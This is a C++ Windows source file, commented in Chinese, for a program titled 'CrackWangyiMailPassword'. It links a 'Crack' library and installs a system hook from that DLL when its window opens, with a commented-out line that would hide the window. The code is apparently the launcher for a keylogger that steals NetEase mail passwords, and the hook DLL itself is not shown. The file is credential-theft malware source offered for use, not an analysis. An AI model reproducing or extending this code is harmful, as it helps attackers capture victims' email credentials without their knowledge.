#include<Windows.h>
#include "Resource.h"
#pragma comment(lib, "Crack.lib")

//安装钩子
extern "C" __declspec(dllimport) BOOL InstallHook();

//卸载钩子
extern "C" __declspec(dllimport) BOOL UninstallHook();

//窗口处理函数
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);


//main函数：控制台窗口程序
//WinMain函数：Windows窗口



//__stdcall 等同WINAPI	HINSTANCE 实例句柄   LPSTR 命令行参数  nCmdShow窗口显示方式
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lpCmdLine, int nCmdShow) {
	//创建一个窗口
	TCHAR szAppClassName[] = TEXT("CrackPassword");

	WNDCLASS wndClass;
	wndClass.cbClsExtra = 0;		//窗口类的扩展空间大小
	wndClass.cbWndExtra = 0;		//窗口的扩展内存大小
	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);	//加载白色背景
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);		//加载光标
	wndClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));		//加载图标
	wndClass.hInstance = hInstance;		//实例句柄
	wndClass.lpfnWndProc = WindowProc;		//窗口处理函数
	wndClass.lpszClassName = szAppClassName;	//窗口类型名
	wndClass.lpszMenuName = NULL;		//菜单名
	wndClass.style = CS_HREDRAW | CS_VREDRAW | CS_DBLCLKS;	//类的风格

	//注册窗口类
	RegisterClass(&wndClass);

	//创建窗口	lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam
	HWND hWnd = CreateWindow(
		szAppClassName,				//窗口类型名
		TEXT("CrackWangyiMailPassword"),	//窗口标题
		WS_OVERLAPPEDWINDOW,		//窗口的风格
		400,						//窗口左上角横坐标
		200,						//窗口左上角纵坐标
		600,						//窗口的宽度
		400,						//窗口的高度
		NULL,						//父窗口句柄
		NULL,						//菜单句柄
		hInstance,					//实例句柄
		NULL						//参数
	);

	//显示更新
	//ShowWindow(hWnd, SW_HIDE);	//隐藏程序运行窗口
	ShowWindow(hWnd, SW_SHOW);		//显示程序运行窗口
	UpdateWindow(hWnd);

	
	//消息循环
	MSG msg;	//WM_QUIT
	while (GetMessage(&msg, NULL, 0, 0)) {
		//将虚拟键消息化为字符消息
		TranslateMessage(&msg);

		//将消息分发给窗口处理函数
		DispatchMessage(&msg);
	}
	
	return 0;
}

//窗口处理函数
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg)
	{
	case WM_CREATE:		//窗口创建消息
		InstallHook();
		break;
	case WM_CLOSE:	//窗口关闭消息
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:	//销毁窗口
		UninstallHook();
		PostQuitMessage(0);
		break;
	default:
		break;
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}